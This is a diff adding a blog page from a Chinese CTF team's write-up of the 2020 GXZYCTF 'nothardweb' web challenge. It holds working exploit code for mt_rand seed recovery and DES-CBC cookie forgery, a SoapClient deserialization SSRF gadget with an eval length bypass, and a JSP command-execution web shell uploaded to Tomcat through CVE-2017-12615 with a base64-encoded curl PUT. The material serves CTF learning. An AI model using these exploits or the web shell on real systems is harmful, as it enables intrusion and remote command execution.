@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/48x48.png">
+  <link rel="icon" type="image/png" sizes="64x64" href="/images/48x48.png">
+  <link rel="icon" type="image/png" sizes="48x48" href="/images/48x48.png">
+  <link rel="mask-icon" href="/images/logo1.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"boiteam.github.io","root":"/","scheme":"Mist","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="first从www.zip获取源码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020 GXZYCTF NORTHWRD">
+<meta property="og:url" content="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_northardweb/index.html">
+<meta property="og:site_name" content="BOI Team">
+<meta property="og:description" content="first从www.zip获取源码">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_northardweb/C:%5CUsers%5Chazel_nut%5CDesktop%5CWEB%E7%AC%AC%E4%B8%89%E8%A1%8C%5C2020_GXZCTF_nothardweb%5Cnorthardweb%5C1584756068474.png">
+<meta property="og:image" content="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_northardweb/1584756141031.png">
+<meta property="article:published_time" content="2020-03-09T01:52:20.000Z">
+<meta property="article:modified_time" content="2020-03-21T08:49:00.959Z">
+<meta property="article:author" content="BOI Team">
+<meta property="article:tag" content="Web_SSRF">
+<meta property="article:tag" content="Web_密码学">
+<meta property="article:tag" content="Web_CBC字节翻转">
+<meta property="article:tag" content="Web_CVE-2017-12615">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_northardweb/C:%5CUsers%5Chazel_nut%5CDesktop%5CWEB%E7%AC%AC%E4%B8%89%E8%A1%8C%5C2020_GXZCTF_nothardweb%5Cnorthardweb%5C1584756068474.png">
+
+<link rel="canonical" href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_northardweb/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>2020 GXZYCTF NORTHWRD | BOI Team</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="BOI Team" type="application/atom+xml">
+</head>
+
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">BOI Team</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_northardweb/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.png">
+      <meta itemprop="name" content="BOI Team">
+      <meta itemprop="description" content="Because Of Interest">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BOI Team">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2020 GXZYCTF NORTHWRD
+        </h1>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-03-09 09:52:20" itemprop="dateCreated datePublished" datetime="2020-03-09T09:52:20+08:00">2020-03-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-21 16:49:00" itemprop="dateModified" datetime="2020-03-21T16:49:00+08:00">2020-03-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web/PHP/" itemprop="url" rel="index"><span itemprop="name">PHP</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="first"><a href="#first" class="headerlink" title="first"></a>first</h1><p>从<a href="http://www.zip获取源码" target="_blank" rel="noopener">www.zip获取源码</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">include</span> <span class="string">"user.php"</span>;</span><br><span class="line">   <span class="keyword">include</span> <span class="string">"conn.php"</span>;</span><br><span class="line">   $IV = <span class="string">"85196940"</span>;<span class="comment">// you cant know that;</span></span><br><span class="line">   <span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">'user'</span>]) || !<span class="keyword">isset</span>($_COOKIE[<span class="string">'hash'</span>]))&#123;</span><br><span class="line">       <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'key'</span>]))&#123;</span><br><span class="line">           $_SESSION[<span class="string">'key'</span>] = strval(mt_rand() &amp; <span class="number">0x5f5e0ff</span>);</span><br><span class="line">           $_SESSION[<span class="string">'iv'</span>] = $IV;</span><br><span class="line">       &#125;</span><br><span class="line">       $username = <span class="string">"guest"</span>;</span><br><span class="line">       $o = <span class="keyword">new</span> User($username);</span><br><span class="line">       <span class="keyword">echo</span> $o-&gt;show();</span><br><span class="line">       $ser_user = serialize($o);</span><br><span class="line">       $cipher = openssl_encrypt($ser_user, <span class="string">"des-cbc"</span>, $_SESSION[<span class="string">'key'</span>], <span class="number">0</span>, $_SESSION[<span class="string">'iv'</span>]);</span><br><span class="line">       setcookie(<span class="string">"user"</span>, base64_encode($cipher), time()+<span class="number">3600</span>);</span><br><span class="line">       setcookie(<span class="string">"hash"</span>, md5($ser_user), time() + <span class="number">3600</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;</span><br><span class="line">       $user = base64_decode($_COOKIE[<span class="string">'user'</span>]);</span><br><span class="line">       $uid = openssl_decrypt($user, <span class="string">'des-cbc'</span>, $_SESSION[<span class="string">'key'</span>], <span class="number">0</span>, $_SESSION[<span class="string">'iv'</span>]);</span><br><span class="line">       <span class="keyword">if</span>(md5($uid) !== $_COOKIE[<span class="string">'hash'</span>])&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">"no hacker!"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       $o = unserialize($uid);</span><br><span class="line">       <span class="keyword">echo</span> $o-&gt;show();</span><br><span class="line">       <span class="keyword">if</span> ($o-&gt;username === <span class="string">"admin"</span>)&#123;</span><br><span class="line">           $_SESSION[<span class="string">'name'</span>] = <span class="string">'admin'</span>;</span><br><span class="line">           <span class="keyword">include</span> <span class="string">"hint.php"</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以观察到, 加密模式为<code>des-cbc</code></p>
+<p>但是明文我们却是知道的, 我们看加密的部分</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$o = <span class="keyword">new</span> User($username);</span><br><span class="line"><span class="keyword">echo</span> $o-&gt;show();</span><br><span class="line">$ser_user = serialize($o);</span><br><span class="line">$cipher = openssl_encrypt($ser_user, <span class="string">"des-cbc"</span>, $_SESSION[<span class="string">'key'</span>], <span class="number">0</span>, $_SESSION[<span class="string">'iv'</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>那么我们现在已知明文密文, 如果能够再获得 key 或者 iv, 就可以直接加解密了, 因为 des-cbc 的加密方式如下（CBC字节翻转原理）</p>
+<p><img src="/2020/03/09/2020_GXZYCTF_northardweb/C:%5CUsers%5Chazel_nut%5CDesktop%5CWEB%E7%AC%AC%E4%B8%89%E8%A1%8C%5C2020_GXZCTF_nothardweb%5Cnorthardweb%5C1584756068474.png" alt="1584756068474"></p>
+<p>我们看第一个块, 首先取 8 个字节的明文, 与<code>IV</code>进行异或, 再与<code>KEY</code>进行加密运算, 之后输出 16 字节的密文, 而如果我们知道<code>KEY</code>, 后面则是用上一个块的加密结果代替<code>IV</code>异或, 而我们如果能知道<code>KEY</code>, 就可以将明文作为<code>IV</code>, 用密文和<code>KEY</code>进行解密, 获得的第一个块的值, 就是 IV</p>
+<p>可以看到红框中的两个部分是一样的, 但是我们如何获取<code>KEY</code>呢, 注意到页面中给了这些信息</p>
+<p><img src="/2020/03/09/2020_GXZYCTF_northardweb/1584756141031.png" alt="1584756141031"></p>
+<p>而源代码中的mt_rand需要seed才能获取随机数。现在已知该函数产生的三个随机数。</p>
+<p>采用文章中介绍的方法获取seed</p>
+<p><a href="https://www.anquanke.com/post/id/196831" target="_blank" rel="noopener">https://www.anquanke.com/post/id/196831</a></p>
+<p>破解脚本需配置三个参数</p>
+<p>各参数分别为</p>
+<ul>
+<li>相隔 226 个数的 R0, R227</li>
+<li>生成 R0 之前已经生成的个数 offset</li>
+<li>flavour 如果是 php7 则为 1, php5 则为 0</li>
+</ul>
+<p>计算的部分如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// input seed</span></span><br><span class="line">$uid_first = $argv[<span class="number">1</span>]??<span class="number">1082636436</span>;</span><br><span class="line">$uid_last = $argv[<span class="number">2</span>]??<span class="number">306106574</span>;</span><br><span class="line">$seed = rtrim(shell_exec(<span class="string">"python seed.py $uid_first $uid_last"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"seed: $seed\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// calc iv</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"username: $this-&gt;username\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> User(<span class="string">"guest"</span>);</span><br><span class="line">$mes = serialize($o);</span><br><span class="line">$c = $argv[<span class="number">3</span>]??<span class="string">"OS8vWDE4Mk5ETklJYytXTUFLZG5xU2hJeFkyQ2tXbTJEb01wWkhRUThkckpYcnFDR2RpalFhb3dDekRTem82RQ%3D%3D"</span>;</span><br><span class="line">$cipher = base64_decode(urldecode($c));</span><br><span class="line">mt_srand(intval($seed));</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">228</span>; $i++)&#123;</span><br><span class="line">    mt_rand();</span><br><span class="line">&#125;</span><br><span class="line">$key = strval(mt_rand() &amp; <span class="number">0x5f5e0ff</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"key: $key\n"</span>;</span><br><span class="line">$iv = substr(openssl_decrypt($cipher, <span class="string">"des-cbc"</span>, $key, <span class="number">0</span>, substr($mes, <span class="number">0</span>, <span class="number">8</span>)),<span class="number">0</span>,<span class="number">8</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"iv: $iv\n"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们就可以进行反序列化了, 先登录为<code>admin</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// calc iv</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $username;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"username: $this-&gt;username\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$o = <span class="keyword">new</span> User(<span class="string">"admin"</span>);</span><br><span class="line">$aaa = serialize($o);</span><br><span class="line">$cipher = openssl_encrypt($aaa, <span class="string">"des-cbc"</span>, $key, <span class="number">0</span>, $iv);</span><br><span class="line">$cookie_user =  base64_encode($cipher);</span><br><span class="line">$cookie_hash =  md5($aaa);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"user: $cookie_user\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"hash: $cookie_hash\n"</span>;</span><br></pre></td></tr></table></figure>
+
+<h1 id="second"><a href="#second" class="headerlink" title="second"></a>second</h1><p>hint.php 中直接给出了位置, 而右键就可以看到注释的源代码,</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'cc'</span>]))&#123;</span><br><span class="line">    $cc = $_GET[<span class="string">'cc'</span>];</span><br><span class="line">    <span class="keyword">eval</span>(substr($cc, <span class="number">0</span>, <span class="number">6</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以通过/?cc=<code>$cc</code>的方式来绕过，因为<code>$cc</code>刚好是 6 个长度, 而<code>$</code>就是重新引用了变量, 使得长度不再受限, 那么我们就可以任意执行了</p>
+<p>但是我们看提示的位置是在内网, 我们进不去, 有什么办法可以进去呢</p>
+<p><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html</a></p>
+<p>可以看到当调用<code>SoapClient</code>类不存在的方法时, 会触发<code>__call</code>, 使得我们拥有一个请求注入的机会, 这里就正好可以用来打 SSRF, 因为源码中存在一个反序列化, 反序列化的参数可控, 并且会调用一个<code>show()</code>方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$o = unserialize($uid);</span><br><span class="line"><span class="keyword">echo</span> $o-&gt;show();</span><br></pre></td></tr></table></figure>
+
+<p>因而poc可以写为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cmd = urlencode(<span class="string">"`\$cc`;bash -c 'payload'"</span>);</span><br><span class="line">$path = <span class="string">"http://10.10.1.12/"</span>;</span><br><span class="line">$path = $path.<span class="string">"?cc=$cmd"</span>;</span><br><span class="line">$o = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'uri'</span> =&gt; $path, <span class="string">'location'</span> =&gt; $path));</span><br><span class="line">$aaa = serialize($o);</span><br></pre></td></tr></table></figure>
+
+<h1 id="third"><a href="#third" class="headerlink" title="third"></a>third</h1><p><a href="https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615</a></p>
+<p>一个tomcat的老洞，找到一个jsp马上传</p>
+<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"023"</span>.equals(request.getParameter(<span class="string">"pwd"</span>)))&#123;</span><br><span class="line">        java.io.InputStream <span class="keyword">in</span> = Runtime.getRuntime().exec(request.getParameter(<span class="string">"i"</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        <span class="keyword">out</span>.print(<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=<span class="keyword">in</span>.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">out</span>.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">out</span>.print(<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT http:<span class="regexp">//</span><span class="number">10.10</span>.<span class="number">2.13</span>:<span class="number">8080</span><span class="regexp">/2.jsp/</span> -d <span class="string">"`echo PCUKICAgIGlmKCIwMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiaSIpKS5nZXRJbnB1dFN0cmVhbSgpOwogICAgICAgIGludCBhID0gLTE7CiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsyMDQ4XTsKICAgICAgICBvdXQucHJpbnQoIjxwcmU+Iik7CiAgICAgICAgd2hpbGUoKGE9aW4ucmVhZChiKSkhPS0xKXsKICAgICAgICAgICAgb3V0LnByaW50bG4obmV3IFN0cmluZyhiKSk7CiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9CiU+|base64 -d`"</span></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+    <div class="social-list">
+            <div class="social-item">
+              <a target="_blank" class="social-link" href="/atom.xml">
+                <span class="icon">
+                  <i class="fa fa-rss"></i>
+                </span>
+                <span class="label">RSS</span>
+              </a>
+            </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Web-SSRF/" rel="tag"><i class="fa fa-tag"></i> Web_SSRF</a>
+              <a href="/tags/Web-%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag"><i class="fa fa-tag"></i> Web_密码学</a>
+              <a href="/tags/Web-CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC/" rel="tag"><i class="fa fa-tag"></i> Web_CBC字节翻转</a>
+              <a href="/tags/Web-CVE-2017-12615/" rel="tag"><i class="fa fa-tag"></i> Web_CVE-2017-12615</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/09/2020_GXZYCTF_dooog/" rel="prev" title="2020 GXZYCTF dooog">
+      <i class="fa fa-chevron-left"></i> 2020 GXZYCTF dooog
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/03/09/2020_GXZYCTF_fmkq/" rel="next" title="2020 GXZYCTF fmkq">
+      2020 GXZYCTF fmkq <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#first"><span class="nav-number">1.</span> <span class="nav-text">first</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#second"><span class="nav-number">2.</span> <span class="nav-text">second</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#third"><span class="nav-number">3.</span> <span class="nav-text">third</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="BOI Team"
+      src="/images/header.png">
+  <p class="site-author-name" itemprop="name">BOI Team</p>
+  <div class="site-description" itemprop="description">Because Of Interest</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">文章</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
